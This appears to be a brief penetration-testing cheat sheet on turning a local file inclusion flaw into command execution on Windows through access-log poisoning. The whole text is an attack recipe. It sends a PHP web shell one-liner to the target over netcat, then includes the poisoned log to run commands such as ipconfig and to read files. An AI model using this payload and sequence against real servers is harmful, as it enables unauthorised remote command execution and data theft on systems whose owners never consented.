# LFI to RFI 
## Windows

### Scenario 1
1. nc -v <ip> 80
2. `<?php echo shell_exec($_GET['cmd']);?>`
3. Find access logs
4. Run command `access.log&cmd=ipconfig` or `access.log&cmd=type C:\file.txt`
